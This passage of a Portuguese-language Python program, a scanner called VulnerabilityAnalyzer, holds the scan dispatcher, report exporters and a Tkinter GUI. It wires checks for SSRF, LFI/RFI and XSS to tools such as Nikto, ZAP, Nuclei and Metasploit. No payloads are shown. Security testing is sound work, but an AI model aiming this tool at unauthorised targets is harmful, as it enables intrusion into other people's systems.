        if Settings['CheckSSRF']:
            test_ssrf(target)
        if Settings['CheckLFI'] or Settings['CheckRFI']:
            test_lfi_rfi(target)
        if Settings['CheckXSStrike']:
            test_xsstrike(target)
        if Settings['CheckNikto']:
            test_nikto(target)
        if Settings['CheckBurp']:
            test_burp(target)
        if Settings['CheckAPI']:
            test_api(target)
        if Settings['CheckAdvancedAPI']:
            test_advanced_api(target)
        if Settings['CheckGraphQL']:
            test_graphql(target)
        if Settings['CheckWebSocket']:
            asyncio.run(test_websocket(target))
        if Settings['CheckCloud']:
            check_cloud_misconfigurations(target)
        if Settings['CheckWfuzz']:
            test_wfuzz(target)
        if Settings['CheckZAP']:
            test_zap(target)
        if Settings['CheckNuclei']:
            test_nuclei(target)
        if Settings['CheckSubdomains']:
            scan_subdomains(target)
    else:
        if Settings['FingerprintOS']:
            fingerprint_os(target)
        scan_ports(target, Settings['PortRange'], 'TCP', lambda h, p: test_metasploit(h, p) if Settings['CheckMetasploit'] else None)

# Função para exportar relatório em JSON
def export_json_report():
    os.makedirs(Settings['ReportDir'], exist_ok=True)
    report_path = os.path.join(Settings['ReportDir'], f'report_{int(time.time())}.json')
    report = {
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'results': ScriptState['Results'],
        'subdomains': ScriptState['Subdomains'],
        'vulnerabilities': ScriptState['Vulnerabilities'],
        'total_vulns': ScriptState['TotalVulnsFound'],
        'total_scans': ScriptState['TotalScans']
    }
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2)
    log_message('INFO', f'Relatório JSON salvo em {report_path}')

# Função para exportar relatório em PDF
def export_pdf_report():
    os.makedirs(Settings['ReportDir'], exist_ok=True)
    report_path = os.path.join(Settings['ReportDir'], f'report_{int(time.time())}.pdf')
    doc = SimpleDocTemplate(report_path, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    story.append(Paragraph('Relatório VulnerabilityAnalyzer', styles['Title']))
    story.append(Spacer(1, 12))
    
    story.append(Paragraph(f'Total de Vulnerabilidades Encontradas: {ScriptState["TotalVulnsFound"]}', styles['Heading2']))
    story.append(Paragraph(f'Total de Varreduras Realizadas: {ScriptState["TotalScans"]}', styles['Heading2']))
    story.append(Spacer(1, 12))
    
    for target, data in ScriptState['Results'].items():
        story.append(Paragraph(f'Alvo: {target}', styles['Heading2']))
        story.append(Spacer(1, 12))
        
        table_data = [['Tipo', 'Descrição', 'Detalhes']]
        for vuln in data['vulns'] + [v for v in ScriptState['Vulnerabilities'] if v[2] == target]:
            table_data.append(vuln)
        
        table = Table(table_data)
        story.append(table)
        story.append(Spacer(1, 12))
    
    if ScriptState['Subdomains']:
        story.append(Paragraph('Subdomínios Encontrados:', styles['Heading2']))
        story.append(Paragraph(', '.join(ScriptState['Subdomains']), styles['Normal']))
        story.append(Spacer(1, 12))
    
    doc.build(story)
    log_message('INFO', f'Relatório PDF salvo em {report_path}')

# Função para exportar relatório em CSV
def export_csv_report():
    os.makedirs(Settings['ReportDir'], exist_ok=True)
    report_path = os.path.join(Settings['ReportDir'], f'report_{int(time.time())}.csv')
    with open(report_path, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Timestamp', time.strftime('%Y-%m-%d %H:%M:%S')])
        writer.writerow(['Total de Vulnerabilidades', ScriptState['TotalVulnsFound']])
        writer.writerow(['Total de Varreduras', ScriptState['TotalScans']])
        writer.writerow([])
        writer.writerow(['Tipo', 'Descrição', 'Detalhes'])
        for vuln in ScriptState['Vulnerabilities']:
            writer.writerow(vuln)
        if ScriptState['Subdomains']:
            writer.writerow([])
            writer.writerow(['Subdomínios Encontrados'])
            for sub in ScriptState['Subdomains']:
                writer.writerow([sub])
    log_message('INFO', f'Relatório CSV salvo em {report_path}')

# Função para exportar relatório em HTML
def export_html_report():
    os.makedirs(Settings['ReportDir'], exist_ok=True)
    report_path = os.path.join(Settings['ReportDir'], f'report_{int(time.time())}.html')
    template_path = os.path.join(Settings['ReportDir'], 'report_template.html')
    
    if not os.path.exists(template_path):
        with open(template_path, 'w') as f:
            f.write('''
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Relatório VulnerabilityAnalyzer</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
        th { background-color: #f0f0f0; }
        #vulnChart { max-width: 600px; margin: 20px 0; }
        .section { margin-bottom: 20px; }
        #filterType { margin: 10px 0; }
    </style>
</head>
<body>
    <h1>Relatório VulnerabilityAnalyzer</h1>
    <div class="section">
        <h2>Resumo</h2>
        <p><strong>Timestamp:</strong> {{timestamp}}</p>
        <p><strong>Total de Vulnerabilidades:</strong> {{total_vulns}}</p>
        <p><strong>Total de Varreduras:</strong> {{total_scans}}</p>
    </div>
    <div class="section">
        <h2>Distribuição de Vulnerabilidades</h2>
        <canvas id="vulnChart"></canvas>
    </div>
    <div class="section">
        <h2>Resultados</h2>
        <select id="filterType" onchange="filterTable()">
            <option value="">Todos os Tipos</option>
            {{filter_options}}
        </select>
        <table id="vulnTable">
            <tr><th>Tipo</th><th>Descrição</th><th>Detalhes</th></tr>
            {{results_table}}
        </table>
    </div>
    <div class="section">
        <h2>Subdomínios Encontrados</h2>
        <p>{{subdomains}}</p>
    </div>
    <script>
        const ctx = document.getElementById('vulnChart').getContext('2d');
        new Chart(ctx, {
            type: 'bar',
            data: {
                labels: {{vuln_labels}},
                datasets: [{
                    label: 'Vulnerabilidades',
                    data: {{vuln_data}},
                    backgroundColor: '#007bff',
                    borderColor: '#0056b3',
                    borderWidth: 1
                }]
            },
            options: {
                scales: { y: { beginAtZero: true } }
            }
        });
        function filterTable() {
            const filter = document.getElementById('filterType').value;
            const rows = document.querySelectorAll('#vulnTable tr:not(:first-child)');
            rows.forEach(row => {
                row.style.display = filter === '' || row.cells[0].textContent === filter ? '' : 'none';
            });
        }
    </script>
</body>
</html>
            ''')

    vuln_types = {}
    for vuln in ScriptState['Vulnerabilities']:
        vuln_type = vuln[0]
        vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
    
    results_table = ''
    for target, data in ScriptState['Results'].items():
        for vuln in data['vulns'] + [v for v in ScriptState['Vulnerabilities'] if v[2] == target]:
            results_table += f'<tr><td>{vuln[0]}</td><td>{vuln[1]}</td><td>{vuln[2]}</td></tr>'
    
    filter_options = ''.join([f'<option value="{t}">{t}</option>' for t in vuln_types.keys()])
    
    with open(template_path, 'r') as f:
        template = f.read()
    
    html_content = template.replace('{{timestamp}}', time.strftime('%Y-%m-%d %H:%M:%S'))
    html_content = html_content.replace('{{total_vulns}}', str(ScriptState['TotalVulnsFound']))
    html_content = html_content.replace('{{total_scans}}', str(ScriptState['TotalScans']))
    html_content = html_content.replace('{{results_table}}', results_table)
    html_content = html_content.replace('{{subdomains}}', ', '.join(ScriptState['Subdomains']) or 'Nenhum')
    html_content = html_content.replace('{{vuln_labels}}', json.dumps(list(vuln_types.keys())))
    html_content = html_content.replace('{{vuln_data}}', json.dumps(list(vuln_types.values())))
    html_content = html_content.replace('{{filter_options}}', filter_options)
    
    with open(report_path, 'w') as f:
        f.write(html_content)
    log_message('INFO', f'Relatório HTML salvo em {report_path}')
    return report_path

# GUI com Tkinter (simplificada, apenas em português)
class VulnerabilityAnalyzerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title('VulnerabilityAnalyzer - Hygark (2025)')
        self.root.geometry('1200x800')
        
        # Notebook (abas)
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(pady=10, padx=10, fill='both', expand=True)

        # Aba de Configurações
        self.config_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.config_frame, text='Configurações')

        tk.Label(self.config_frame, text='VulnerabilityAnalyzer').pack(pady=10)
        
        # Entradas
        tk.Label(self.config_frame, text='Alvos (URLs ou IPs, separados por vírgula):').pack()
        self.target_entry = tk.Entry(self.config_frame, width=60)
        self.target_entry.insert(0, ','.join(Settings['Targets']))
        self.target_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Intervalo de Portas (ex.: 1-1000):').pack()
        self.port_entry = tk.Entry(self.config_frame, width=20)
        self.port_entry.insert(0, f"{Settings['PortRange'][0]}-{Settings['PortRange'][1]}")
        self.port_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Threads:').pack()
        self.threads_entry = tk.Entry(self.config_frame, width=10)
        self.threads_entry.insert(0, str(Settings['Threads']))
        self.threads_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Caminho do XSStrike:').pack()
        self.xsstrike_entry = tk.Entry(self.config_frame, width=60)
        self.xsstrike_entry.insert(0, Settings['XSStrikePath'])
        self.xsstrike_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Caminho do Nikto:').pack()
        self.nikto_entry = tk.Entry(self.config_frame, width=60)
        self.nikto_entry.insert(0, Settings['NiktoPath'])
        self.nikto_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Caminho do Wfuzz:').pack()
        self.wfuzz_entry = tk.Entry(self.config_frame, width=60)
        self.wfuzz_entry.insert(0, Settings['WfuzzPath'])
        self.wfuzz_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Caminho da Wordlist (Wfuzz):').pack()
        self.wordlist_entry = tk.Entry(self.config_frame, width=60)
        self.wordlist_entry.insert(0, Settings['WordlistPath'])
        self.wordlist_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Caminho do Nuclei:').pack()
        self.nuclei_entry = tk.Entry(self.config_frame, width=60)
        self.nuclei_entry.insert(0, Settings['NucleiPath'])
        self.nuclei_entry.pack(pady=5)

        tk.Label(self.config_frame, text='URL da API do Burp Suite:').pack()
        self.burp_url_entry = tk.Entry(self.config_frame, width=60)
        self.burp_url_entry.insert(0, Settings['BurpApiUrl'])
        self.burp_url_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Chave da API do Burp Suite:').pack()
        self.burp_key_entry = tk.Entry(self.config_frame, width=60)
        self.burp_key_entry.insert(0, Settings['BurpApiKey'])
        self.burp_key_entry.pack(pady=5)

        tk.Label(self.config_frame, text='URL da API do OWASP ZAP:').pack()
        self.zap_url_entry = tk.Entry(self.config_frame, width=60)
        self.zap_url_entry.insert(0, Settings['ZAPApiUrl'])
        self.zap_url_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Chave da API do OWASP ZAP:').pack()
        self.zap_key_entry = tk.Entry(self.config_frame, width=60)
        self.zap_key_entry.insert(0, Settings['ZAPApiKey'])
        self.zap_key_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Host do Metasploit:').pack()
        self.metasploit_host_entry = tk.Entry(self.config_frame, width=60)
        self.metasploit_host_entry.insert(0, Settings['MetasploitHost'])
        self.metasploit_host_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Porta do Metasploit:').pack()
        self.metasploit_port_entry = tk.Entry(self.config_frame, width=20)
        self.metasploit_port_entry.insert(0, str(Settings['MetasploitPort']))
        self.metasploit_port_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Usuário do Metasploit:').pack()
        self.metasploit_user_entry = tk.Entry(self.config_frame, width=60)
        self.metasploit_user_entry.insert(0, Settings['MetasploitUser'])
        self.metasploit_user_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Senha do Metasploit:').pack()
        self.metasploit_pass_entry = tk.Entry(self.config_frame, width=60, show='*')
        self.metasploit_pass_entry.insert(0, Settings['MetasploitPass'])
        self.metasploit_pass_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Servidor Syslog:').pack()
        self.syslog_server_entry = tk.Entry(self.config_frame, width=60)
        self.syslog_server_entry.insert(0, Settings['SyslogServer'])
        self.syslog_server_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Porta Syslog:').pack()
        self.syslog_port_entry = tk.Entry(self.config_frame, width=20)
        self.syslog_port_entry.insert(0, str(Settings['SyslogPort']))
        self.syslog_port_entry.pack(pady=5)

        tk.Label(self.config_frame, text='Subdomínios (separados por vírgula):').pack()
        self.subdomain_entry = tk.Entry(self.config_frame, width=60)
        self.subdomain_entry.insert(0, ','.join(Settings['SubdomainList']))
        self.subdomain_entry.pack(pady=5)

        # Testes
        tk.Label(self.config_frame, text='Testes:').pack(pady=5)
        self.check_vars = {
            'SQLi': tk.BooleanVar(value=Settings['CheckSQLi']),
            'XSS': tk.BooleanVar(value=Settings['CheckXSS']),
            'CSRF': tk.BooleanVar(value=Settings['CheckCSRF']),
            'SSRF': tk.BooleanVar(value=Settings['CheckSSRF']),
            'LFI': tk.BooleanVar(value=Settings['CheckLFI']),
            'RFI': tk.BooleanVar(value=Settings['CheckRFI']),
            'Headers': tk.BooleanVar(value=Settings['CheckHeaders']),
            'CMS': tk.BooleanVar(value=Settings['CheckCMS']),
            'Subdomains': tk.BooleanVar(value=Settings['CheckSubdomains']),
            'XSStrike': tk.BooleanVar(value=Settings['CheckXSStrike']),
            'Nikto': tk.BooleanVar(value=Settings['CheckNikto']),
            'Burp': tk.BooleanVar(value=Settings['CheckBurp']),
            'API': tk.BooleanVar(value=Settings['CheckAPI']),
            'AdvancedAPI': tk.BooleanVar(value=Settings['CheckAdvancedAPI']),
            'GraphQL': tk.BooleanVar(value=Settings['CheckGraphQL']),
            'WebSocket': tk.BooleanVar(value=Settings['CheckWebSocket']),
            'Cloud': tk.BooleanVar(value=Settings['CheckCloud']),
            'Wfuzz': tk.BooleanVar(value=Settings['CheckWfuzz']),
            'ZAP': tk.BooleanVar(value=Settings['CheckZAP']),
            'Metasploit': tk.BooleanVar(value=Settings['CheckMetasploit']),
            'Nuclei': tk.BooleanVar(value=Settings['CheckNuclei']),
            'OS': tk.BooleanVar(value=Settings['FingerprintOS']),
            'JSON': tk.BooleanVar(value=Settings['ExportJSON']),
            'PDF': tk.BooleanVar(value=Settings['ExportPDF']),
            'CSV': tk.BooleanVar(value=Settings['ExportCSV']),
            'HTML': tk.BooleanVar(value=Settings['ExportHTML']),
            'Syslog': tk.BooleanVar(value=Settings['ExportSyslog'])
        }
        test_frame = tk.Frame(self.config_frame)
        test_frame.pack()
        for i, (name, var) in enumerate(self.check_vars.items()):
            tk.Checkbutton(test_frame, text=name, variable=var).grid(row=i//4, column=i%4, padx=5, pady=2, sticky='w')

        # Aba de Dashboard
        self.dashboard_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.dashboard_frame, text='Dashboard')

        self.progress_var = tk.StringVar(value=f'Progresso: 0 vulnerabilidades, 0/{Settings["PortRange"][1]-Settings["PortRange"][0]+1} portas')
        tk.Label(self.dashboard_frame, textvariable=self.progress_var).pack(pady=10)

        self.progress_bar = ttk.Progressbar(self.dashboard_frame, length=400, mode='determinate')
        self.progress_bar.pack(pady=5)

        self.vuln_canvas = tk.Canvas(self.dashboard_frame)
        self.vuln_canvas.pack(pady=10, fill='both', expand=True)
        self.vuln_figure, self.vuln_ax = plt.subplots(figsize=(6, 4))
        self.vuln_canvas_widget = FigureCanvasTkAgg(self.vuln_figure, master=self.vuln_canvas)
        self.vuln_canvas_widget.get_tk_widget().pack()

        # Aba de Resultados
        self.result_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.result_frame, text='Resultados')

        self.result_text = tk.Text(self.result_frame, height=15, width=80)
        self.result_text.pack(pady=10, padx=10)

        # Aba de Relatórios
        self.reports_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.reports_frame, text='Relatórios')

        self.html_frame = HtmlFrame(self.reports_frame, height=400)
        self.html_frame.pack(pady=10, padx=10, fill='both', expand=True)

        # Botões
        button_frame = tk.Frame(self.result_frame)
        button_frame.pack(pady=5)
        tk.Button(button_frame, text='Iniciar Varredura', command=self.start_scan).pack(side='left', padx=5)
        tk.Button(button_frame, text='Parar Varredura', command=self.stop_scan).pack(side='left', padx=5)
        tk.Button(button_frame, text='Salvar Configurações', command=self.save_settings).pack(side='left', padx=5)
        tk.Button(button_frame, text='Visualizar Gráficos', command=self.show_graphs).pack(side='left', padx=5)
        tk.Button(button_frame, text='Exportar Relatórios', command=self.export_reports).pack(side='left', padx=5)

    def start_scan(self):
        if ScriptState['IsRunning']:
            messagebox.showerror('Erro', 'Varredura já em andamento!')
            return
        ScriptState['IsRunning'] = True
        ScriptState['Vulnerabilities'] = []
        ScriptState['TotalScans'] = 0
        ScriptState['TotalVulnsFound'] = 0
        ScriptState['Results'] = {}
        ScriptState['Subdomains'] = []
        self.result_text.delete(1.0, tk.END)
        
        try:
            targets = [t.strip() for t in self.target_entry.get().split(',')]
            port_range = tuple(map(int, self.port_entry.get().split('-')))
            threads = int(self.threads_entry.get())
            if len(port_range) != 2 or port_range[0] > port_range[1]:
                raise ValueError('Intervalo de portas inválido.')
        except ValueError as e:
            messagebox.showerror('Erro', f'Entrada inválida: {e}')
            ScriptState['IsRunning'] = False
            return
        
        Settings['Targets'] = targets
        Settings['PortRange'] = port_range
        Settings['Threads'] = threads
        
        def scan_thread():
            for target in Settings['Targets']:
                if not ScriptState['IsRunning']:
                    break
                log_message('INFO', f'Varredura iniciada em {target}')
                self.result_text.insert(tk.END, f'Iniciando varredura em {target}...\n')
                scan_target(target)
                self.result_text.insert(tk.END, f'Varredura concluída em {target}.\n')
                self.update_dashboard()
            ScriptState['IsRunning'] = False
            self.result_text.insert(tk.END, 'Varredura finalizada.\n')
            self.update_dashboard()
        
        threading.Thread(target=scan_thread, daemon=True).start()

    def stop_scan(self):
        ScriptState['IsRunning'] = False
        self.result_text.insert(tk.END, 'Varredura parada.\n')
        log_message('INFO', 'Varredura parada.')

    def save_settings(self):
        try:
            Settings['Targets'] = [t.strip() for t in self.target_entry.get().split(',')]
            Settings['PortRange'] = tuple(map(int, self.port_entry.get().split('-')))
            Settings['Threads'] = int(self.threads_entry.get())
            Settings['XSStrikePath'] = self.xsstrike_entry.get()
            Settings['NiktoPath'] = self.nikto_entry.get()
            Settings['WfuzzPath'] = self.wfuzz_entry.get()
            Settings['WordlistPath'] = self.wordlist_entry.get()
            Settings['NucleiPath'] = self.nuclei_entry.get()
            Settings['BurpApiUrl'] = self.burp_url_entry.get()
            Settings['BurpApiKey'] = self.burp_key_entry.get()
            Settings['ZAPApiUrl'] = self.zap_url_entry.get()
            Settings['ZAPApiKey'] = self.zap_key_entry.get()
            Settings['MetasploitHost'] = self.metasploit_host_entry.get()
            Settings['MetasploitPort'] = int(self.metasploit_port_entry.get())
            Settings['MetasploitUser'] = self.metasploit_user_entry.get()
            Settings['MetasploitPass'] = self.metasploit_pass_entry.get()
            Settings['SyslogServer'] = self.syslog_server_entry.get()
            Settings['SyslogPort'] = int(self.syslog_port_entry.get())
            Settings['SubdomainList'] = [s.strip() for s in self.subdomain_entry.get().split(',')]
            for name, var in self.check_vars.items():
                Settings[f'Check{name}' if name in ['SQLi', 'XSS', 'CSRF', 'SSRF', 'LFI', 'RFI', 'Headers', 'CMS', 'Subdomains', 'XSStrike', 'Nikto', 'Burp', 'API', 'AdvancedAPI', 'GraphQL', 'WebSocket', 'Cloud', 'Wfuzz', 'ZAP', 'Metasploit', 'Nuclei'] else f'{name}'] = var.get()
            messagebox.showinfo('Sucesso', 'Configurações salvas.')
            log_message('INFO', 'Configurações salvas.')
        except Exception as e:
            messagebox.showerror('Erro', f'Erro ao salvar configurações: {e}')
            log_message('ERRO', f'Erro ao salvar configurações: {e}')

    def update_dashboard(self):
        total_ports = Settings['PortRange'][1] - Settings['PortRange'][0] + 1
        self.progress_var.set(f'Progresso: {ScriptState["TotalVulnsFound"]} vulnerabilidades, {ScriptState["TotalScans"]}/{total_ports} portas')
        progress = (ScriptState['TotalScans'] / total_ports) * 100 if total_ports > 0 else 0
        self.progress_bar['value'] = progress
        
        vuln_types = {}
        for vuln in ScriptState['Vulnerabilities']:
            vuln_type = vuln[0]
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
        
        self.vuln_ax.clear()
        if vuln_types:
            self.vuln_ax.bar(vuln_types.keys(), vuln_types.values())
            self.vuln_ax.set_ylabel('Número de Vulnerabilidades')
            self.vuln_ax.set_title('Distribuição de Vulnerabilidades')
            plt.xticks(rotation=45, ha='right')
        else:
            self.vuln_ax.text(0.5, 0.5, 'Nenhuma vulnerabilidade encontrada.', horizontalalignment='center', verticalalignment='center')
        self.vuln_canvas_widget.draw()

        self.result_text.delete(1.0, tk.END)
        for target, data in ScriptState['Results'].items():
            self.result_text.insert(tk.END, f'Alvo: {target}\n')
            self.result_text.insert(tk.END, f'Portas abertas: {", ".join(data["ports"]) or "Nenhuma"}\n')
            for vuln in data['vulns'] + [v for v in ScriptState['Vulnerabilities'] if v[2] == target]:
                self.result_text.insert(tk.END, f'  - {vuln[0]}: {vuln[1]} ({vuln[2]})\n')
        if ScriptState['Subdomains']:
            self.result_text.insert(tk.END, '\nSubdomínios encontrados:\n')
            for sub in ScriptState['Subdomains']:
                self.result_text.insert(tk.END, f'  - {sub}\n')

    def show_graphs(self):
        if not ScriptState['Vulnerabilities']:
            messagebox.showinfo('Info', 'Nenhuma vulnerabilidade encontrada para exibir.')
            return
        self.notebook.select(self.dashboard_frame)
        self.update_dashboard()

    def export_reports(self):
        if Settings['ExportJSON']:
            export_json_report()
        if Settings['ExportPDF']:
            export_pdf_report()
        if Settings['ExportCSV']:
            export_csv_report()
        if Settings['ExportHTML']:
            report_path = export_html_report()
            self.html_frame.load_file(report_path)
        messagebox.showinfo('Sucesso', 'Relatórios exportados com sucesso.')
        log_message('INFO', 'Relatórios exportados com sucesso.')

# Função principal
def main():
    root = tk.Tk()
    app = VulnerabilityAnalyzerGUI(root)
    root.mainloop()

if __name__ == '__main__':
    main()